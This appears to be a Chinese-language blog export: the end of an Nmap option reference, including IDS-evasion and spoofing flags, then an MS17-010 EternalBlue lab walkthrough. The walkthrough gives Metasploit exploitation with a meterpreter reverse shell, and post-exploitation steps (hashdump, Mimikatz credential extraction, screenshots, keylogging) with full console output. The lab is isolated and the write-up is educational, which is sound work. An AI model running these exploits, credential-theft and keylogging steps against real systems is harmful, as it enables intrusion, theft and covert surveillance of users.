调试级别2 扫描结果筛选与解释 --open 功能：只显示开放端口 示例：nmap --open 192.168.1.0/24 --reason 功能：显示端口状态原因。显示为什么端口被标记为开放/关闭/过滤。 示例：nmap --reason 192.168.1.100 调试与信息收集 --packet-trace 功能：数据包跟踪，显示发送和接收的每个数据包。 示例：nmap --packet-trace 192.168.1.100 --iflist 功能：列出接口和路由 示例：nmap --iflist --traceroute 功能：路由跟踪 示例：nmap --traceroute 192.168.1.100 网络与DNS配置 -n 功能：不用域名解析（加快扫描速度，不进行反向DNS查询。） 示例：nmap -n 192.168.1.100 -R 功能：为所有目标解析域名。即使目标以IP形式给出，也进行DNS解析。 示例：nmap -R scanme.nmap.org --system-dns 功能：使用系统DNS解析器而不是内置解析器 示例：nmap --system-dns 192.168.1.100 -e 功能：指定网络接口 示例：nmap -e eth0 192.168.1.0/24、nmap -e eth0 192.168.1.0/24 -6 功能：IPv6扫描 示例：nmap -6 2001:db8::1 性能与定时控制 -T\u0026lt;0-5\u0026gt; 功能：时序模板，数字越大越快，也越易被发现 示例：nmap -T4 192.168.1.100 --min-rate 功能：最小速率。确保扫描速度不低于每秒100个包。 示例：nmap --min-rate 100 192.168.1.100 --max-rate 功能：最大速率。限制扫描速度不超过每秒10个包。 示例：nmap --max-rate 10 192.168.1.100 --scan-delay 功能：探测速率控制。每次探测间隔100ms 示例：nmap --scan-delay 100ms 192.168.1.100 --min-parallelism / --max-parallelism 功能：并行度 示例：nmap --min-parallelism 10 --max-parallelism 100 192.168.1.100 --max-retries 功能：最大重试次数 示例：nmap --max-retries 1 192.168.1.100 防火墙/IDS规避与欺骗 -f 功能：使用小数据包分片 示例：nmap -f 192.168.1.100 -D 功能：使用诱饵IP进行隐藏 示例：nmap -D RND:10 192.168.1.100 --source-port 功能：使用特定源端口（如53端口可能被防火墙允许） 示例：nmap --source-port 53 192.168.1.100 --data-length 功能：添加随机数据，在每个包后添加指定长度的随机数据。 示例：nmap --data-length 100 192.168.1.100 --ttl 功能：设置TTL值 示例：nmap --ttl 64 192.168.1.100 --spoof-mac 功能：MAC地址欺骗 示例：nmap --spoof-mac 00:11:22:33:44:55 192.168.1.100、nmap --spoof-mac 0 # 随机MAC地址 --badsum 功能：发送错误校验和 示例：nmap --badsum 192.168.1.100 权限与运行模式 --privileged / --unprivileged 功能：当以非root用户运行时模拟原始套接字。 示例：nmap --unprivileged 192.168.1.100 # 非特权模式 附件 nmap.pdf ","date":"2025-12-30T16:27:59+08:00","permalink":"http://localhost:1313/p/kali-toolkitnmapnetwork-mapper/","title":"【Kali Toolkit】Nmap（Network Mapper）"},{"content":"MS17-010漏洞利用 目录 实践概览 MS17-010漏洞 环境配置 实践步骤 隔离网络环境配置与端口扫描 一、在 VMware 中创建并分配 LAN 区段（对 Kali 和 Win7 执行相同操作）： 二、配置 Win7 的静态IP并关闭防火墙 三、配置Kali的静态IP地址并测试二者连通性 四、Nmap扫描结果分析 Metasploit扫描与漏洞利用 一、启动Metasploit框架（root）： 二、搜索ms17-010相关模块： 三、探测目标主机 四、漏洞利用 典型的“后渗透”攻击行为 一、凭据窃取 1. 导出哈希值（Hashdump） 2. 抓取内存中的明文密码（Mimikatz） 二、隐私监控与取证（Monitoring） 1. 实时屏幕截图 2. 键盘记录（Keylogging） 3. 文件窃取与上传 三、Metasploit持久化后门攻击 利用Windows服务机制实现权限维持 相关原理 四、Shell 实践概览 名称：MS17-010漏洞利用 目的： 时间：2025年12月30日 风险说明：本实验在完全隔离的虚拟化实验室环境下进行，仅用于教育或授权测试 MS17-010漏洞 名称：MS17-010 别名：永恒之蓝（EternalBlue） 公开时间：2017.3.14（补丁发布）；2017.4.14（攻击工具公开） 相关CVE：CVE-2017-0143；CVE-2017-0144；CVE-2017-0145；CVE-2017-0146；CVE-2017-0148 （远程代码执行）；CVE-2017-0147 （信息泄露） 相关协议：服务器消息块 1.0 （SMBv1） 相关端口：TCP 445（主要）；139（次要） 漏洞原理：源于 Windows 内核处理 SMBv1 协议请求的缓冲区溢出。在处理文件扩展属性转换时，系统因错误计算内存大小，导致攻击者可以发送精心构造的数据包，在内核权限下执行任意代码。 破坏性： 无需用户交互：攻击者只需向目标主机的445端口发送恶意数据包即可入侵，无需用户点击/打开任何文件 危害等级高：成功利用后攻击者可在目标系统上执行任意操作，如安装恶意程序、窃取数据、加密文件（勒索软件）或创建后门 易于蠕虫化传播：WannaCry 勒索病毒采用的方式，导致其在全球范围内像蠕虫一样自动、快速地蔓延 影响范围：此漏洞影响当时几乎所有未打补丁的 Windows 版本，主要包括： 桌面系统：Windows XP, Vista, 7, 8, 8.1, Windows 10 (早期版本) 服务器系统：Windows Server 2003, 2008, 2008 R2, 2012, 2012 R2, 2016 漏洞修复：安装官方安全补丁——Windows Update 或访问微软官方安全公告手动下载并安装编号为KB4013389 的补丁。或手动：禁用 SMBv1 协议、网络层面封堵、使用入侵防御系统（IPS）、最小化网络暴露 环境配置 虚拟环境：VMware Workstation 17 Pro - 17.0.0 build-20800274 靶机： 系统：Windows 7 Enterprise x64 CPU：11th Gen Intel(R) Core(TM) i7-11800H @ 2.30GHz (2.30 GHz) 网络：LAN（IPv4:10.0.0.17/SubnetMask:255.255.255.0/Gateway:NULL/DNS:NULL） 攻击机： 系统：Linux kali 6.12.25-amd64 CPU：11th Gen Intel(R) Core(TM) i7-11800H @ 2.30GHz (2.30 GHz) 网络：LAN（IPv4:10.0.0.223/SubnetMask:255.255.255.0/Gateway:NULL/DNS:NULL） 实践步骤 隔离网络环境配置与端口扫描 一、在 VMware 中创建并分配 LAN 区段（对 Kali 和 Win7 执行相同操作）： 打开设置（Setting） -\u0026gt; 选择网络适配器（Network Adapter） -\u0026gt; 右侧点击LAN区段（LAN Segment）单选框 -\u0026gt; 点击下方“LAN区段\u0026hellip;”按钮 -\u0026gt; 在弹出的窗口中点击添加（Add） -\u0026gt; 输入名称**“MS17-010_Experiment”** -\u0026gt; 点击确定 -\u0026gt; 在下拉菜单中选中刚刚创建的LAN区段 -\u0026gt; 点击确定\n二、配置 Win7 的静态IP并关闭防火墙 进入Win7 -\u0026gt; 打开控制面板 -\u0026gt; 网络和 Internet -\u0026gt; 网络和共享中心 -\u0026gt; 更改适配器设置 -\u0026gt; 右键点击本地连接 -\u0026gt; 属性 -\u0026gt; 双击Internet 协议版本4（TCP/IPv4） -\u0026gt; 选择使用静态IP地址（IP地址：10.0.0.17 | 子网掩码：255.255.255.0 | 默认网关：空） -\u0026gt; 点击确定退出 -\u0026gt; 在**“网络与共享中心”点击Windows防火墙** -\u0026gt; 选择**“打开或关闭Windows防火墙”** -\u0026gt; 全部关闭（PS：没打补丁不关闭防火墙也能成功）\n三、配置Kali的静态IP地址并测试二者连通性 打开终端 -\u0026gt; ip addr指令查看网卡名称（通常为eth0） -\u0026gt; 手动分配IP地址：\n1 2 3 sudo systemctl stop NetworkMaager # 关闭NetworkManager服务——Kali 默认运行NetworkManager服务。当手动使用ip命令修改接口状态时，NetworkManager会检测到接口配置发生了变化。如果该接口被它接管，它会根据自己的配置文件（通常是DHCP或“自动连接”）立即重置接口，从而抹掉刚刚手动添加的IP地址 sudo ip addr add 10.0.0.223/24 dev eth0 # 将IP地址10.0.0.223分配给eth0网卡 sudo ip link set eth0 up # 激活eth0网卡，让它开始工作 -\u0026gt; 再次输入ip addr验证eth0的IP地址 -\u0026gt; 测试两者连通性并进行Namp扫描：\n1 2 ping 10.0.0.17 -c 4 # 只发送4个数据包 nmap -n -sV -sC -T4 10.0.0.17 # 不进行DNS解析，使用默认的Nmap脚本探测服务/版本信息 四、Nmap扫描结果分析 上述Nmap扫描结果如下所示：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 ┌──(kali㉿kali)-[~] └─$ nmap -n -sV -sC -T4 10.0.0.17 Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-31 02:51 UTC Nmap scan report for 10.0.0.17 Host is up (0.00047s latency). Not shown: 991 closed tcp ports (reset) PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows 7 Enterprise 7600 microsoft-ds (workgroup: WORKGROUP) 49152/tcp open msrpc Microsoft Windows RPC 49153/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC 49155/tcp open msrpc Microsoft Windows RPC 49156/tcp open msrpc Microsoft Windows RPC 49157/tcp open msrpc Microsoft Windows RPC MAC Address: 00:0C:29:10:6D:B7 (VMware) Service Info: Host: ANKH-PC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb-os-discovery: | OS: Windows 7 Enterprise 7600 (Windows 7 Enterprise 6.1) | OS CPE: cpe:/o:microsoft:windows_7::- | Computer name: Ankh-PC | NetBIOS computer name: ANKH-PC\\x00 | Workgroup: WORKGROUP\\x00 |_ System time: 2025-12-31T10:52:28+08:00 |_clock-skew: mean: -2h40m00s, deviation: 4h37m07s, median: 0s |_nbstat: NetBIOS name: ANKH-PC, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: 00:0c:29:10:6d:b7 (VMware) | smb2-time: | date: 2025-12-31T02:52:28 |_ start_date: 2025-12-31T02:41:52 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2:1:0: |_ Message signing enabled but not required Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 69.41 seconds 靶机信息\nIP地址：10.0.0.17\n主机状态：在线（延迟 0.00047s）\n操作系统：Windows 7 Enterprise 7600 (版本 6.1)\n主机名：ANKH-PC\n工作组：WORKGROUP\nMAC地址：00:0C:29:10:6D:B7 (VMware 虚拟机)\n系统时间：UTC+8 (北京时间)\n开放端口与服务\n135/tcp - Microsoft Windows RPC (MSRPC)\n139/tcp - Microsoft Windows NetBIOS-SSN\n445/tcp - Microsoft-DS (SMB)\nWindows 7 Enterprise 7600\n工作群组：WORKGROUP\n49152-49157/tcp - Microsoft Windows RPC (MSRPC)\nSMB安全评估\n身份验证级别：用户级\n消息签名：已启用但非必需（默认配置）\n签名状态：已禁用（存在风险，但为默认设置，可能面临中间人攻击风险）\n尝试账户：guest\nMetasploit扫描与漏洞利用 一、启动Metasploit框架（root）： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 ┌──(root㉿kali)-[~] └─# msfconsole Metasploit tip: Save the current environment with the save command, future console restarts will use this environment again +-------------------------------------------------------+ | METASPLOIT by Rapid7 | +---------------------------+---------------------------+ | __________________ | | | ==c(______(o(______(_() | |\u0026#34;\u0026#34;\u0026#34;\u0026#34;\u0026#34;\u0026#34;\u0026#34;\u0026#34;\u0026#34;\u0026#34;\u0026#34;\u0026#34;|======[*** | | )=\\ | | EXPLOIT \\ | | // \\\\ | |_____________\\_______ | | // \\\\ | |==[msf \u0026gt;]============\\ | | // \\\\ | |______________________\\ | | // RECON \\\\ | \\(@)(@)(@)(@)(@)(@)(@)/ | | // \\\\ | ********************* | +---------------------------+---------------------------+ | o O o | \\\u0026#39;\\/\\/\\/\u0026#39;/ | | o O | )======( | | o | .\u0026#39; LOOT \u0026#39;. | | |^^^^^^^^^^^^^^|l___ | / _||__ \\ | | | PAYLOAD |\u0026#34;\u0026#34;\\___, | / (_||_ \\ | | |________________|__|)__| | | __||_) | | | |(@)(@)\u0026#34;\u0026#34;\u0026#34;**|(@)(@)**|(@) | \u0026#34; || \u0026#34; | | = = = = = = = = = = = = | \u0026#39;--------------\u0026#39; | +---------------------------+---------------------------+ =[ metasploit v6.4.69-dev ] + -- --=[ 2529 exploits - 1302 auxiliary - 432 post ] + -- --=[ 1672 payloads - 49 encoders - 13 nops ] + -- --=[ 9 evasion ] Metasploit Documentation: https://docs.metasploit.com/ msf6 \u0026gt; 二、搜索ms17-010相关模块： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 msf6 \u0026gt; search ms17-010 Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/windows/smb/ms17_010_eternalblue 2017-03-14 average Yes MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption 1 \\_ target: Automatic Target . . . . 2 \\_ target: Windows 7 . . . . 3 \\_ target: Windows Embedded Standard 7 . . . . 4 \\_ target: Windows Server 2008 R2 . . . . 5 \\_ target: Windows 8 . . . . 6 \\_ target: Windows 8.1 . . . . 7 \\_ target: Windows Server 2012 . . . . 8 \\_ target: Windows 10 Pro . . . . 9 \\_ target: Windows 10 Enterprise Evaluation . . . . 10 exploit/windows/smb/ms17_010_psexec 2017-03-14 normal Yes MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution 11 \\_ target: Automatic . . . . 12 \\_ target: PowerShell . . . . 13 \\_ target: Native upload . . . . 14 \\_ target: MOF upload . . . . 15 \\_ AKA: ETERNALSYNERGY . . . . 16 \\_ AKA: ETERNALROMANCE . . . . 17 \\_ AKA: ETERNALCHAMPION . . . . 18 \\_ AKA: ETERNALBLUE . . . . 19 auxiliary/admin/smb/ms17_010_command 2017-03-14 normal No MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution 20 \\_ AKA: ETERNALSYNERGY . . . . 21 \\_ AKA: ETERNALROMANCE . . . . 22 \\_ AKA: ETERNALCHAMPION . . . . 23 \\_ AKA: ETERNALBLUE . . . . 24 auxiliary/scanner/smb/smb_ms17_010 . normal No MS17-010 SMB RCE Detection 25 \\_ AKA: DOUBLEPULSAR . . . . 26 \\_ AKA: ETERNALBLUE . . . . 27 exploit/windows/smb/smb_doublepulsar_rce 2017-04-14 great Yes SMB DOUBLEPULSAR Remote Code Execution 28 \\_ target: Execute payload (x64) . . . . 29 \\_ target: Neutralize implant . . . . Interact with a module by name or index. For example info 29, use 29 or use exploit/windows/smb/smb_doublepulsar_rce After interacting with a module you can manually set a TARGET with set TARGET \u0026#39;Neutralize implant\u0026#39; msf6 \u0026gt; 以上为metasploit中的ms17-010（永恒之蓝）模块。\nMS17-010 (永恒之蓝) 漏洞利用套件详解\n主要攻击模块\na. exploit/windows/smb/ms17_010_eternalblue (索引 0-9)\n介绍： 这是最著名、最直接的攻击模块。它利用SMBv1协议的内核级漏洞，通过越界写入破坏内核内存池，实现远程代码执行。攻击过程直接在内核态进行，极其“暴力”。 漏洞类型： SMB协议远程内核池破坏漏洞。 利用方式： 发送特制SMBv1数据包触发内核内存破坏。 目标系统： Windows 7 / Server 2008 R2（主要目标） Windows 8/8.1 / Server 2012 Windows 10 Pro/Enterprise 特点： 无需任何身份验证。 对Windows 7/2008 R2成功率较高。 操作风险高：由于直接操作内核内存，若堆喷射失败，极易导致目标系统蓝屏死机(BSOD)。 依赖目标开启445端口。 关键参数： GroomAllocations。调整此内存分配参数有时能在攻击失败时提高成功率。 b. exploit/windows/smb/ms17_010_psexec (索引 10-18)\n介绍： 此模块不一定需要凭证。它主要利用EternalRomance等漏洞链，通过SMB命名管道中的类型混淆漏洞进行攻击。相比EternalBlue更稳定，是攻击更新系统（如Win10）的首选。 技术集合： 融合了多个SMB漏洞，包括EternalRomance、EternalSynergy、EternalChampion。 目标类型： PowerShell： 通过PowerShell在内存中执行载荷。 Native upload： 直接上传可执行文件执行。 MOF upload： 使用WMI托管对象格式执行。 优点： 比EternalBlue更稳定，几乎不会导致蓝屏。 支持多种载荷传输和执行方式。 如果拥有有效的SMB凭证（即使是普通用户），成功率接近100%。 辅助模块\na. auxiliary/scanner/smb/smb_ms17_010 (索引 24-26)\n介绍： 攻击前必备的侦察模块。用于安全地检测目标主机是否存在MS17-010漏洞，并检查是否已被植入DoublePulsar后门。 功能： 检测目标是否存在MS17-010漏洞。 检测目标是否已感染DoublePulsar后门。 输出解读： VULNERABLE： 目标存在漏洞，可尝试攻击。 DoublePulsar detected： 目标已被攻破，内存中驻留有后门。 特点： 非入侵性，仅用于信息收集。 支持扫描整个网段（set RHOSTS 192.168.1.0/24）。 b. auxiliary/admin/smb/ms17_010_command (索引 19-23)\n介绍： 一个轻量级的命令执行模块。不返回交互式Shell，仅执行单条系统命令并返回结果。适用于快速、隐蔽的任务。\n功能： 在已确认存在漏洞或已被控的系统上执行命令。\n用途：\n后渗透阶段快速执行命令（如whoami、添加用户）。 在不建立持久连接的情况下进行操作。 同样支持EternalRomance等多种利用方式。 后门利用模块\nexploit/windows/smb/smb_doublepulsar_rce (索引 27-29)\nDoublePulsar是什么： 一个隐蔽的、无文件落地的内存SMB后门，通常由EternalBlue攻击成功后植入。\n核心功能：\nExecute payload： 若发现目标已存在DoublePulsar后门，可直接通过此后门注入DLL或执行代码，无需再次触发原始漏洞。 Neutralize implant： 在渗透测试结束后，专业地清除内存中的后门痕迹。 目标选项：\n注入载荷： 利用现有后门执行代码。 清除后门： 卸载DoublePulsar植入物。 高级配置选项（通用）\n这些参数在多数相关模块中通用：\nRHOST / RHOSTS： 目标IP地址或IP范围（如192.168.1.10或192.168.1.0/24）。 RPORT： SMB服务端口，默认为445。 SMBUser / SMBPass： SMB用户名和密码（对于psexec模块尤其重要）。 VERIFY_ARCH： 是否验证目标系统架构（64位/32位）。 VERIFY_TARGET： 是否验证目标操作系统版本。 GroomAllocations： (EternalBlue专用) 调整初始内存分配请求的数量，以影响内核内存布局。 三、探测目标主机 1 2 3 4 5 6 7 8 9 msf6 \u0026gt; use 24 msf6 auxiliary(scanner/smb/smb_ms17_010) \u0026gt; set rhost 10.0.0.17 rhost =\u0026gt; 10.0.0.17 msf6 auxiliary(scanner/smb/smb_ms17_010) \u0026gt; run [+] 10.0.0.17:445 - Host is likely VULNERABLE to MS17-010! - Windows 7 Enterprise 7600 x64 (64-bit) /usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.17/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator \u0026#39;+\u0026#39; and \u0026#39;?\u0026#39; was replaced with \u0026#39;*\u0026#39; in regular expression [*] 10.0.0.17:445 - Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed msf6 auxiliary(scanner/smb/smb_ms17_010) \u0026gt; 关键信息：Host is likely VULNERABLE to MS17-010! - Windows 7 Enterprise 7600 x64 (64-bit)\n四、漏洞利用 切换exploit模块 -\u0026gt; 设置靶机IP -\u0026gt; 设置攻击机IP -\u0026gt; 设置载荷 -\u0026gt; 检察配置信息 -\u0026gt; run -\u0026gt; 权限验证\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 msf6 auxiliary(scanner/smb/smb_ms17_010) \u0026gt; use 0 [*] Using configured payload windows/x64/meterpreter/reverse_tcp msf6 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; set rhost 10.0.0.17 rhost =\u0026gt; 10.0.0.17 msf6 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; set lhost 10.0.0.223 lhost =\u0026gt; 10.0.0.223 msf6 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; set payload windows/x64/meterpreter/reverse_tcp payload =\u0026gt; windows/x64/meterpreter/reverse_tcp msf6 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; show options Module options (exploit/windows/smb/ms17_010_eternalblue): Name Current Setting Required Description ---- --------------- -------- ----------- RHOSTS 10.0.0.17 yes The target host(s), see https: //docs.metasploit.com/docs/usi ng-metasploit/basics/using-met asploit.html RPORT 445 yes The target port (TCP) SMBDomain no (Optional) The Windows domain to use for authentication. Onl y affects Windows Server 2008 R2, Windows 7, Windows Embedde d Standard 7 target machines. SMBPass no (Optional) The password for th e specified username SMBUser no (Optional) The username to aut henticate as VERIFY_ARCH true yes Check if remote architecture m atches exploit Target. Only af fects Windows Server 2008 R2, Windows 7, Windows Embedded St andard 7 target machines. VERIFY_TARGET true yes Check if remote OS matches exp loit Target. Only affects Wind ows Server 2008 R2, Windows 7, Windows Embedded Standard 7 t arget machines. Payload options (windows/x64/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC thread yes Exit technique (Accepted: \u0026#39;\u0026#39;, seh, thread, process, none) LHOST 10.0.0.223 yes The listen address (an interface ma y be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Automatic Target View the full module info with the info, or info -d command. PS：漏洞利用（Exploit）只是打开大门的“钥匙”，载荷（Payload）是进门之后要执行的任务。Metasploit 将默认Payload设置为windows/x64/meterpreter/reverse_tcp。其中windows/x64指明靶机系统是64位 windows 系统；meterpreter是 Metasploit 的“王牌”载荷，运行在内存中，不写入硬盘（难以被察觉），且提供了极其丰富的内置命令（如 hashdump, screenshot, webcam_snap），远比普通的 CMD 命令行强大；reverse_tcp指明使用反向TCP连接，用于绕过防火墙，同时确保在复杂的网络环境下，攻击载荷能稳定地传输和通信，不会轻易断开连接。\nPS：设置反向连接后，需要指定lhost参数，以指定靶机出发漏洞后能够成功连接回攻击机\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 msf6 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; run [*] Started reverse TCP handler on 10.0.0.223:4444 [*] 10.0.0.17:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check [+] 10.0.0.17:445 - Host is likely VULNERABLE to MS17-010! - Windows 7 Enterprise 7600 x64 (64-bit) [*] 10.0.0.17:445 - Scanned 1 of 1 hosts (100% complete) [+] 10.0.0.17:445 - The target is vulnerable. [*] 10.0.0.17:445 - Connecting to target for exploitation. [+] 10.0.0.17:445 - Connection established for exploitation. [+] 10.0.0.17:445 - Target OS selected valid for OS indicated by SMB reply [*] 10.0.0.17:445 - CORE raw buffer dump (25 bytes) [*] 10.0.0.17:445 - 0x00000000 57 69 6e 64 6f 77 73 20 37 20 45 6e 74 65 72 70 Windows 7 Enterp [*] 10.0.0.17:445 - 0x00000010 72 69 73 65 20 37 36 30 30 rise 7600 [+] 10.0.0.17:445 - Target arch selected valid for arch indicated by DCE/RPC reply [*] 10.0.0.17:445 - Trying exploit with 12 Groom Allocations. [*] 10.0.0.17:445 - Sending all but last fragment of exploit packet [*] 10.0.0.17:445 - Starting non-paged pool grooming [+] 10.0.0.17:445 - Sending SMBv2 buffers [+] 10.0.0.17:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer. [*] 10.0.0.17:445 - Sending final SMBv2 buffers. [*] 10.0.0.17:445 - Sending last fragment of exploit packet! [*] 10.0.0.17:445 - Receiving response from exploit packet [+] 10.0.0.17:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)! [*] 10.0.0.17:445 - Sending egg to corrupted connection. [*] 10.0.0.17:445 - Triggering free of corrupted buffer. [*] Sending stage (203846 bytes) to 10.0.0.17 [*] Meterpreter session 1 opened (10.0.0.223:4444 -\u0026gt; 10.0.0.17:49161) at 2025-12-31 05:39:27 +0000 [+] 10.0.0.17:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= [+] 10.0.0.17:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= [+] 10.0.0.17:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= meterpreter \u0026gt; 1 2 meterpreter \u0026gt; getuid Server username: NT AUTHORITY\\SYSTEM PS：当前权限——NT AUTHORITY\\SYSTEM 权限（通常简称为 System 权限）是 Windows 操作系统中的最高权限。在 Windows 安全模型中，SYSTEM 账户（也称为本地系统账户）是操作系统内核及其核心服务运行的身份。\n它比管理员（Administrator）更高级：Administrator 仍然受用户帐户控制（UAC）的限制，而 SYSTEM 账户不受任何限制。 权限范围：它拥有对本地计算机上所有资源（文件、注册表、进程、硬件）的完整访问权限。 现在，攻击机可以进行以下行为：\n读取所有用户的文件：Kali可以进入 C:\\Users\\ 下任何一个文件夹（如 Administrator 或其他普通用户），读取他们的桌面、文档和隐私文件。 控制所有进程：Kali可以杀死防火墙进程、杀毒软件进程，或者将你的恶意程序注入到任何系统进程（如 lsass.exe）中。 操作注册表：Kali可以修改系统的核心配置，甚至破坏系统引导。 获取明文密码：只有在 SYSTEM 权限下，Kali才能使用 load kiwi (Mimikatz) 从内存中提取出其他已登录用户的明文密码。 权限降级（伪装）：Kali可以随意切换到任何一个普通用户的身份（通过 impersonate_token），看看他们在电脑上留下了什么。 典型的“后渗透”攻击行为 一、凭据窃取 1. 导出哈希值（Hashdump） 1 2 3 4 5 meterpreter \u0026gt; hashdump Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: Ankh:1000:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: HomeGroupUser$:1002:aad3b435b51404eeaad3b435b51404ee:e19302c2cb502fb48256d5cfbb575047::: PS：这是靶机用户登陆密码的NTLM哈希。攻击者即使不知道明文，也可以通过“哈希传递攻击（Pass-the-Hash）”直接登录其他机器。\n在线哈希穷举解密：CMD5\n2. 抓取内存中的明文密码（Mimikatz） load kiwi # 加载增强版的Mimikatz -\u0026gt; creds_all # 尝试提取所有凭证\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 meterpreter \u0026gt; load kiwi Loading extension kiwi... .#####. mimikatz 2.2.0 20191125 (x64/windows) .## ^ ##. \u0026#34;A La Vie, A L\u0026#39;Amour\u0026#34; - (oe.eo) ## / \\ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) ## \\ / ## \u0026gt; http://blog.gentilkiwi.com/mimikatz \u0026#39;## v ##\u0026#39; Vincent LE TOUX ( vincent.letoux@gmail.com ) \u0026#39;#####\u0026#39; \u0026gt; http://pingcastle.com / http://mysmartlogon.com ***/ Success. meterpreter \u0026gt; creds_all [+] Running as SYSTEM [*] Retrieving all credentials msv credentials =============== Username Domain LM NTLM SHA1 -------- ------ -- ---- ---- Ankh Ankh-PC 44efce164ab921caa 32ed87bdb5fdc5e9c 6ed5833cf35286ebf8 ad3b435b51404ee ba88547376818d4 662b7b5949f0d742bb ec3f wdigest credentials =================== Username Domain Password -------- ------ -------- (null) (null) (null) ANKH-PC$ WORKGROUP (null) Ankh Ankh-PC 123456 tspkg credentials ================= Username Domain Password -------- ------ -------- Ankh Ankh-PC 123456 kerberos credentials ==================== Username Domain Password -------- ------ -------- (null) (null) (null) Ankh Ankh-PC 123456 ankh-pc$ WORKGROUP (null) PS：在Win7中，攻击者通常能够直接看到Password一栏显示了明文密码，这是由于Win7默认将凭据存储在lsass进程内存中，且未加密。SYSTEM权限可以直接读取它。\n二、隐私监控与取证（Monitoring） 1. 实时屏幕截图 1 2 meterpreter \u0026gt; screenshot Screenshot saved to: /root/ZuMWyRDh.jpeg 2. 键盘记录（Keylogging） 如果当前是System权限则切换到用户权限 -\u0026gt; keyscan_start # 开启键盘监听 -\u0026gt; Ankh用户输入Hello? -\u0026gt; keyscan_dump # Kali屏幕输出记录下的按键 -\u0026gt; keyscan_stop # 停止监听\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 meterpreter \u0026gt; getuid # 查看当前权限：SYSTEM Server username: NT AUTHORITY\\SYSTEM meterpreter \u0026gt; ps # 查看进程列表，Session 1通常代表用户 Process List ============ PID PPID Name Arch Session User Path --- ---- ---- ---- ------- ---- ---- 0 0 [System Pr ocess] 4 0 System x64 0 268 4 smss.exe x64 0 NT AUTHORITY\\SYS \\SystemRoot\\Syste TEM m32\\smss.exe 312 484 svchost.ex x64 0 NT AUTHORITY\\LOC e AL SERVICE 344 328 csrss.exe x64 0 NT AUTHORITY\\SYS C:\\Windows\\system TEM 32\\csrss.exe 360 484 SearchInde x64 0 NT AUTHORITY\\SYS xer.exe TEM 392 328 wininit.ex x64 0 NT AUTHORITY\\SYS C:\\Windows\\system e TEM 32\\wininit.exe 404 384 csrss.exe x64 1 NT AUTHORITY\\SYS C:\\Windows\\system TEM 32\\csrss.exe 448 384 winlogon.e x64 1 NT AUTHORITY\\SYS C:\\Windows\\system xe TEM 32\\winlogon.exe 484 392 services.e x64 0 NT AUTHORITY\\SYS C:\\Windows\\system xe TEM 32\\services.exe 500 392 lsass.exe x64 0 NT AUTHORITY\\SYS C:\\Windows\\system TEM 32\\lsass.exe 508 392 lsm.exe x64 0 NT AUTHORITY\\SYS C:\\Windows\\system TEM 32\\lsm.exe 620 484 svchost.ex x64 0 NT AUTHORITY\\SYS e TEM 696 484 svchost.ex x64 0 NT AUTHORITY\\NET e WORK SERVICE 760 484 svchost.ex x64 0 NT AUTHORITY\\LOC e AL SERVICE 836 484 